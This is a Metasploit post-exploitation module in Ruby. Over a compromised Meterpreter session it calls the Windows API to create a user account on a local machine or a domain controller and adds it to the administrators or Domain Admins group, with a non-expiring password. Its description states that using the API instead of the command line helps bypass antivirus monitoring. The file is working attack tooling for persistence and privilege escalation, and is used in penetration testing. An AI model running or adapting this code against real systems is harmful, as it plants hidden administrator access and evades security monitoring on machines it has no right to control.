##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Priv
  include Msf::Exploit::Deprecated

  moved_from 'post/windows/manage/add_user_domain'

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Local User Account Addition',
      'Description'   => %q{
        This module adds a local user account to the specified server with windows api,
        or the local machine if no server is given.
        Because anti-virus software monitors the command line,  using Windows API can bypass anti-virus software to some extent.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
      [
        'Chris Lennert',  # First author
        'Kali-Team'
      ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
      [
        [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/680' ],
        [ 'URL', 'https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user' ]
      ]
    ))

    register_options(
      [
        OptString.new('USERNAME',        [ true,  'The username of the user to add (not-qualified, e.g. BOB)' ]),
        OptString.new('PASSWORD',        [ false, 'The password of the user account to be created' ]),
        OptString.new('SERVER_NAME', [ false, 'DNS or NetBIOS name of remote server on which to add user, e.g. \\\\XXX.kali-team.cn.(Escape sequences:\\\\\\\\ => \\\\)']),
        OptString.new('GROUP',   [ false, 'The local group to which the specified users or global groups will be added.(if it not exists)']),
        OptBool.new('DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', true ]),
        OptBool.new('ADD_TO_DOMAIN', [true,  'Add to Domain if true, Add to Local if false', false]),
      ])
  end

  #
  # InitializeUnicodeStr(&uStr,L"string");
  #
  def alloc_and_write_str(value)
    if value == nil
    return 0
    else
    data = client.railgun.util.str_to_uni_z(value)
    result = client.railgun.kernel32.VirtualAlloc(nil, data.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if result['return'].nil?
      print_error "Failed to allocate memory on the host."
      return nil
    end
    addr = result['return']
    if client.railgun.memwrite(addr, data, data.length)
      return addr
    else
      print_error "Failed to write to memory on the host."
      return nil
    end
    end
  end

  def check_result(user_result)
    case user_result['return']
    when client.railgun.const('ERROR_ACCESS_DENIED')
      print_error 'Sorry, you do not have permission to add that user.'
    when client.railgun.const('NERR_UserExists')
      print_status 'User already exists.'
    when client.railgun.const('NERR_GroupExists')
      print_status 'Group already exists.'
    when client.railgun.const('NERR_UserNotFound')
      print_error 'The user name could not be found.'
    when client.railgun.const('NERR_InvalidComputer')
      print_error 'The server you specified was invalid.'
    when client.railgun.const('NERR_NotPrimary')
      print_error 'You must be on the primary domain controller to do that.'
    when client.railgun.const('NERR_GroupNotFound')
      print_error 'The local group specified by the groupname parameter does not exist.'
    when client.railgun.const('NERR_PasswordTooShort')
      print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
    when client.railgun.const('ERROR_ALIAS_EXISTS')
      print_status 'The local group already exists.'
    when client.railgun.const('NERR_UserInGroup')
      print_status 'The user already belongs to this group.'
    when client.railgun.const('ERROR_MORE_DATA')
      print_status 'More entries are available. Specify a large enough buffer to receive all entries.'
    when client.railgun.const('ERROR_NO_SUCH_ALIAS')
      print_status 'The specified account name is not a member of the local group.'
    when client.railgun.const('ERROR_NO_SUCH_MEMBER')
      print_status 'One or more of the members specified do not exist. Therefore, no new members were added.).'
    when client.railgun.const('ERROR_MEMBER_IN_ALIAS')
      print_status 'One or more of the members specified were already members of the local group. No new members were added.'
    when client.railgun.const('ERROR_INVALID_MEMBER')
      print_status 'One or more of the members cannot be added because their account type is invalid. No new members were added.'
    when client.railgun.const('RPC_S_SERVER_UNAVAILABLE')
      print_status 'The RPC server is unavailable.'
    else
      error = user_result['GetLastError']
      print_error "Unexpectedly returned #{user_result}"
    end
  end

def local_mode()
  if datastore['GROUP'] == nil
    datastore['GROUP'] = 'administrators'
    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
  end
  if datastore['SERVER_NAME'][0,2] != '\\\\'
    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
    return nil
  end
  addr_username    = alloc_and_write_str(datastore['USERNAME'])
  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
  addr_group   = alloc_and_write_str(datastore['GROUP'])
  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
  if addr_username.nil? || addr_password.nil?
    return nil
  end
  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
  if dont_expire_pwd
    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
  end
  #  Set up the USER_INFO_1 structure.
  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
  user_info = [
    addr_username,
    addr_password,
    0x0,
    0x1,
    0x0,
    0x0,
    client.railgun.const(acct_flags),
    0x0
  ].pack("VVVVVVVV")
  #  Add user
  result = add_user(datastore['SERVER_NAME'], user_info)
  if result['return'] == 0
    print_good("User '#{datastore['USERNAME']}' was added!")
  else
    check_result(result)
  end
  #  Add localgroup if it not exists
  #  Set up the #  LOCALGROUP_INFO_1 structure.
  localgroup_info = [
    addr_group, #  lgrpi1_name
    0x0 #  lgrpi1_comment
  ].pack("VV")
  result = add_localgroup(datastore['SERVER_NAME'], localgroup_info)
  if result['return'] == 0
    print_good("Group '#{datastore['GROUP']}'  was added!")
  else
    check_result(result)
  end
  #  Add Member to LocalGroup
  #  Set up the LOCALGROUP_MEMBERS_INFO_3 structure.
  localgroup_members = [
    addr_username, #  lgrmi3_domainandname
  ].pack("V")
  result = add_members_localgroup(datastore['SERVER_NAME'], datastore['GROUP'], localgroup_members)
  if result['return'] == 0
    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
  else
    check_result(result)
  end
  # free memory
  client.railgun.multi([
    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]], #  addr_group
  ])
end

def domain_mode()
  ## enum domain
  domain = get_domain(nil, 'DomainControllerName')
  if domain
    # primary_domain = domain.split('.')[0].upcase.to_s
    print_good("Found Domain : #{domain}")
  else
    print_error("Oh, Domain server not found.")
    return false
  end
  if datastore['GROUP'] == nil
    datastore['GROUP'] = 'Domain Admins'
    print_status("You have not set up a group. The default is '#{datastore['GROUP']}' " )
  end
  if datastore['SERVER_NAME'] == nil
    datastore['SERVER_NAME'] = domain
    print_status("You have not set up a server_name. The default is '#{datastore['SERVER_NAME']}' " )
  end
  if datastore['SERVER_NAME'][0,2] != '\\\\'
    print_error("Wrong format of service name, e.g. \\\\XXX.kali-team.cn,(Escape sequences:\\\\\\\\ => \\\\)")
    return nil
  end
  addr_username    = alloc_and_write_str(datastore['USERNAME'])
  addr_password     = alloc_and_write_str(datastore['PASSWORD'])
  addr_group   = alloc_and_write_str(datastore['GROUP'])
  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
  if domain_admins
    print_good("Domain Group Members:"<<domain_admins.to_s)
  end
  dont_expire_pwd = datastore['DONT_EXPIRE_PWD']
  if addr_username.nil? || addr_password.nil?
    return nil
  end
  acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
  if dont_expire_pwd
    acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
  end
  #  Set up the USER_INFO_1 structure.
  #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
  user_info = [
    addr_username,
    addr_password,
    0x0,
    0x1,
    0x0,
    0x0,
    client.railgun.const(acct_flags),
    0x0
  ].pack("VVVVVVVV")
  #  Add user
  result = add_user(datastore['SERVER_NAME'], user_info)
  if result['return'] == 0
    print_good("User '#{datastore['USERNAME']}' was added!")
  else
    check_result(result)
  end
  #  https://docs.microsoft.com/zh-cn/windows/win32/api/lmaccess/ns-lmaccess-group_info_1
  # Set up the GROUP_INFO_1 structure.
  group_info_1 = [
    addr_group,
    0x0
  ].pack("VV")
  #  Add localgroup if it not exists
  result = add_group(datastore['SERVER_NAME'], group_info_1)
  if result['return'] == 0
    print_good("Group '#{datastore['GROUP']}'  was added!")
  else
    check_result(result)
  end
  # Add member to domain group
  result = add_members_group(datastore['SERVER_NAME'], datastore['GROUP'], datastore['USERNAME'])
  if result['return'] == 0
    print_good("'#{datastore['USERNAME']}' is now a member of the '#{datastore['GROUP']}' group!")
  else
    check_result(result)
  end
  domain_admins = get_members_from_group(datastore['SERVER_NAME'], datastore['GROUP'])
  if domain_admins
    print_good("Now,Domain Group Members:"<<domain_admins.to_s)
  end
  # free memory
  client.railgun.multi([
    ["kernel32", "VirtualFree", [addr_username, 0, MEM_RELEASE]], #  addr_username
    ["kernel32", "VirtualFree", [addr_password, 0, MEM_RELEASE]],  #  addr_password
    ["kernel32", "VirtualFree", [addr_group, 0, MEM_RELEASE]],          #  addr_group
  ])
end

  def run
    print_status("Running module on '#{sysinfo['Computer']}'")
    if datastore["ADD_TO_DOMAIN"]
      print_status("Domain Mode")
      domain_mode()
    else
      print_status("Local Mode")
      local_mode()
    end
  return nil
  end
end
